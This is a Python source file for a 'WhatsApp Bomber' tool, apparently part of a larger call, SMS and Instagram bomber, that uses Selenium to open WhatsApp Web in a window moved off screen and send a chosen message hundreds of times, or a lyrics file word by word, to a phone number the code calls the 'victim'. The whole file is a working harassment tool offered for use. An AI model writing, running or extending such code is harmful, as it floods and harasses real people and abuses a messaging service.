def wpbombing():
    from selenium import webdriver
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    import time
    import os


    options = Options()
    options.add_argument("--log-level=3")
    browser = webdriver.Chrome("chromedriver.exe", chrome_options=options)
    browser.get('https://web.whatsapp.com/')

    try:
        confirm = WebDriverWait(browser, 600).until(EC.presence_of_element_located(
            (By.CLASS_NAME, "PVMjB")))
    finally:
        pass

    browser.set_window_position(-10000,0)

    wp_victim = input("    |-$ Victim's Phone Number (with country code) > ")
    bad_chars = ['+', ' ', '-'] 

    for i in bad_chars : 
        wp_victim = wp_victim.replace(i, '') 

    mode = input('''    |
    |-PRESS------------------|
    | 1] Repetitive Mode     |
    | 2] Script/Lyrical Mode |
    | Facing Problem ?       |
    |    Check out README.MD |
    |------------------------|
    |-> ''')

    if mode.lower() == '1' or mode.lower() == 'repetitive mode':
        reptxt = input('    |-$ Word/Sentence that you want to send Multiple Times > ')
        repcount = int(input('    |-$ How many times ? > '))

    elif mode.lower() == '2' or mode.lower() == 'script/lyrical mode':
        lyrics = open("lyrics.txt","r+")  
        splitedlyrics = (lyrics.read().split()) 

    os.system('cls')
    print(f'''

    All Bombs away Sir
                 \      Goodbye Dullsville!
                __|__  /
        .'(\     .-.     /)'.
    +-====(*)===: " :===(o)=====-+
            \).  '-'  .(/
                    +=
                    +=
                    +=          █▄▄ █▀█ █▀▄▀█ █▄▄ █▀▀ █▀█ ▀█▀ █ █ █▀█ █▄ █
                                █▄█ █▄█ █ ▀ █ █▄█ ██▄ █▀▄  █  █▀█ █▄█ █ ▀█
                    +=
                    +=          ###########################################
                    +=          # Version >>> v1.0 (Beta)                 #
                                # Last Update >>> 11th July 2020          #
                    +=          # Coded by b3!ngD3v (Pramurta Sinha)      #
                    +=          # Named by Ritik Gupta                    #
                    +=          # GitHub >>> https://github.com/b31ngd3v  #
                    +=          ###########################################


    |-PRESS---------------|
    | 1] Call Bomber      |
    | 2] SMS Bomber       |
    | 3] Instagram Bomber |
    | 4] WhatsApp Bomber  |
    | 5] About            |
    | 6] Exit Script      |
    |---------------------|
    |-> 4
    |-$ Victim's Phone Number (with country code) > {wp_victim}
    |
    |-PRESS------------------|
    | 1] Repetitive Mode     |
    | 2] Script/Lyrical Mode |
    | Facing Problem ?       |
    |    Check out README.MD |
    |------------------------|
    |-> {mode}''')

    if mode.lower() == '1' or mode.lower() == 'repetitive mode':
        print(
    f'''    |-$ Word/Sentence that you want to send Multiple Times > {reptxt}
    |-$ How many times ? > {repcount}''')

    browser.get(f'https://web.whatsapp.com/send?phone={wp_victim}&text&source&data&app_absent')

    try:
        confirm = WebDriverWait(browser, 600).until(EC.presence_of_element_located(
            (By.CLASS_NAME, "PVMjB")))
    finally:
        pass 

    try:
        confirm = WebDriverWait(browser, 600).until(EC.presence_of_element_located(
            (By.CLASS_NAME, "_2FVVk._2UL8j")))
    except:
        print("    |-} please recheck victim's mobile no. ")
    finally:
        pass

    if mode.lower() == '1' or mode.lower() == 'repetitive mode':
        for i in range(repcount):
            browser.find_element_by_class_name("_2FVVk._2UL8j").send_keys(reptxt + Keys.ENTER)

    elif mode.lower() == '2' or mode.lower() == 'script/lyrical mode':
        for words in splitedlyrics:
            browser.find_element_by_class_name("_2FVVk._2UL8j").send_keys(words + Keys.ENTER)
    time.sleep(5)
    print(
    '''    |-} Done !
    |-----------------------------------------------------------''')
    browser.quit()
